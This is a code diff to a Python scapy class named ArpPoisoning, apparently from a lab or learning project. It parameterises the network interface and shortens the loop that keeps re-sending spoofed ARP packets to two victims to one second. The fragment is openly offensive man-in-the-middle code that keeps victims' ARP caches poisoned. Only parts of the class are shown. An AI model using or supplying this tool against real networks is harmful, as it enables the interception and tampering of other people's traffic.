@@ -7,11 +7,12 @@ from scapy.layers.l2 import Ether, ARP
 
 class ArpPoisoning:
     # initialize the mac and ips of the victims
-    def __init__(self, ip_victim1, ip_victim2, mac_attacker, ip_attacker):
+    def __init__(self, ip_victim1, ip_victim2, mac_attacker, ip_attacker, interface):
         self.ip_victim1 = ip_victim1
         self.ip_victim2 = ip_victim2
         self.mac_attacker = mac_attacker
         self.ip_attacker = ip_attacker
+        self.interface = interface
 
     # create arp package
     def create_pack(self, mac_attacker, ip_to_spoof, ip_victim):
@@ -27,9 +28,9 @@ class ArpPoisoning:
     # refresh arp tables in case victim updates itself
     def maintain_arp_poison(self, arp1, arp2):
         while True:
-            sendp(arp1, iface="enp0s8")
-            sendp(arp2, iface="enp0s8")
-            time.sleep(5)
+            sendp(arp1, iface=self.interface)
+            sendp(arp2, iface=self.interface)
+            time.sleep(1)
 
     # execute the arp poisoning
     def execute_poisoning(self):
